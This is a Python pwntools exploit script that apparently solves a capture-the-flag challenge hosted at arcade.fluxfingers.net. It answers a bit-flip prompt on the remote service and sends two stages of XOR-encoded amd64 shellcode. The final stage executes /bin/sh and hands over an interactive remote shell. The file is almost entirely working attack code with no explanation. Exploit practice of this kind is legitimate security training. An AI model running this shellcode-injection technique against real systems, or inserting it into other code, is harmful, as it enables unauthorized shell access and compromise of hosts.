#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright Â© 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"

r=remote("arcade.fluxfingers.net",1807)

r.sendlineafter("Please enter the byte-offset you want to flip (0x80-0x139): ","bc")
r.sendlineafter("Please enter the bitposition you want to flip at byte-offset(7-0): ","3")


r.recvuntil("Enter the Key to win: ")
   
shellcode_r = """
   call here
   .ascii "/bin/sh"
   .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx, rdx
   mov rax,0x3b
   syscall
"""

shellcode = """
   pop rdi
   mov eax,ebx
   mov dl,0x43
   jmp . - 0x6f
"""

sh = asm(shellcode,arch="amd64")
sh += chr(0)

send_sh = [ord(x) for x in sh]
sh = send_sh

print send_sh
i = len(send_sh)
while i >1:
    send_sh[i-2] = send_sh[i-1] ^ sh[i-2]
    i -= 1

print send_sh


send_sh = [chr(x) for x in send_sh]
send_sh = ''.join(send_sh)

payload = chr(0)*0x27 + send_sh[:-1]
r.send(payload)

real_sh = asm(shellcode_r, arch = 'amd64')
print hex(len(real_sh))

real_sh += chr(0x2c)
real_sh = [x for x in real_sh]
rsh = real_sh
print rsh

i = len(real_sh)
while i >1:
    real_sh[i-2] = chr(ord(real_sh[i-1]) ^ ord(rsh[i-2]))
    i -= 1

print real_sh
real_sh = ''.join(real_sh)
payload2 = 'a'*0x26 + real_sh

r.sendline(payload2)
r.interactive()
